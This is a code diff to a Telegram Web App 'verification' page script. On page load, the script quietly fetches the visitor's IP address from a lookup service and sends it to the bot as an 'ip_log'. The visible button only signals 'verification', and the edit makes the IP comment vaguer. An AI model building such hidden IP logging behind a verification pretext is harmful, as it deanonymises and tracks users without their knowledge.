@@ -73,24 +73,23 @@
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand(); // Expands the web app panel
-
-        // Fetch user's IP and send it to the bot immediately
+		
+		 // Fetch user's IP
         fetch("https://api.ipify.org?format=json")
             .then(response => response.json())
             .then(data => {
-                const userIP = data.ip; // Get the user's IP
-                console.log("User IP:", userIP); // Debugging in console
-
-                // Send the IP to the bot immediately
-                const ipData = JSON.stringify({ type: "ip_log", ip: userIP });
-                tg.sendData(ipData);
+                const userIP = data.ip; // Store IP in variable
+                //console.log("User IP:", userIP); // Debugging in console
+				
+				const ip_data = JSON.stringify({ type: "ip_log", ip: userIP });
+				tg.sendData(ip_data);
             })
             .catch(error => console.error("Error fetching IP:", error));
-
+		
         function verify() {
-            // When clicked, sends the verification data to the bot
-            const data = JSON.stringify({ type: "verification" });
-            tg.sendData(data);
+            // When clicked, sends the data to the bot
+			const verify = JSON.stringify({ type: "verification" });
+            tg.sendData(verify);
             tg.close(); // Close the panel after verification
         }
     </script>
